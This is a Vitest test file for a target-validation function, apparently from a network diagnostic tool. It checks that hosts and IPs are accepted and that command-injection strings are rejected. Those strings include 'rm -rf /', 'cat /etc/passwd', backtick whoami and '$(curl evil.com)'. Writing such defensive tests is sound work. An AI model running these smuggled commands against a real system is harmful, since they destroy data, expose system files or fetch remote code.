import { describe, it, expect } from 'vitest'
import { validateTarget } from '../src/validation.js'

describe('validateTarget', () => {
  describe('valid inputs', () => {
    it('accepts a simple IPv4 address', () => {
      expect(validateTarget('8.8.8.8')).toMatchObject({ valid: true, target: '8.8.8.8' })
    })

    it('accepts a hostname', () => {
      expect(validateTarget('google.com')).toMatchObject({ valid: true, target: 'google.com' })
    })

    it('accepts a subdomain', () => {
      expect(validateTarget('sub.domain.example.com')).toMatchObject({ valid: true })
    })

    it('accepts an IPv6 address', () => {
      expect(validateTarget('2001:4860:4860::8888')).toMatchObject({ valid: true })
    })

    it('trims whitespace before validation', () => {
      const result = validateTarget('  1.1.1.1  ')
      expect(result).toMatchObject({ valid: true, target: '1.1.1.1' })
    })
  })

  describe('invalid inputs — injection attempts', () => {
    it('rejects semicolon injection', () => {
      expect(validateTarget('google.com; rm -rf /')).toMatchObject({ valid: false })
    })

    it('rejects pipe injection', () => {
      expect(validateTarget('google.com | cat /etc/passwd')).toMatchObject({ valid: false })
    })

    it('rejects backtick injection', () => {
      expect(validateTarget('google.com`whoami`')).toMatchObject({ valid: false })
    })

    it('rejects dollar sign injection', () => {
      expect(validateTarget('$(curl evil.com)')).toMatchObject({ valid: false })
    })

    it('rejects ampersand injection', () => {
      expect(validateTarget('google.com && evil')).toMatchObject({ valid: false })
    })

    it('rejects newline injection', () => {
      expect(validateTarget('google.com\nrm -rf /')).toMatchObject({ valid: false })
    })

    it('rejects space in target', () => {
      expect(validateTarget('google.com evil.com')).toMatchObject({ valid: false })
    })

    it('rejects slash', () => {
      expect(validateTarget('/etc/passwd')).toMatchObject({ valid: false })
    })
  })

  describe('invalid inputs — edge cases', () => {
    it('rejects empty string', () => {
      expect(validateTarget('')).toMatchObject({ valid: false })
    })

    it('rejects whitespace-only string', () => {
      expect(validateTarget('   ')).toMatchObject({ valid: false })
    })

    it('rejects string exceeding 253 characters', () => {
      const longTarget = 'a'.repeat(254)
      expect(validateTarget(longTarget)).toMatchObject({ valid: false })
    })

    it('accepts exactly 253 characters', () => {
      const maxTarget = 'a'.repeat(253)
      expect(validateTarget(maxTarget)).toMatchObject({ valid: true })
    })

    it('rejects non-string input', () => {
      expect(validateTarget(null)).toMatchObject({ valid: false })
      expect(validateTarget(undefined)).toMatchObject({ valid: false })
      expect(validateTarget(42)).toMatchObject({ valid: false })
    })
  })
})
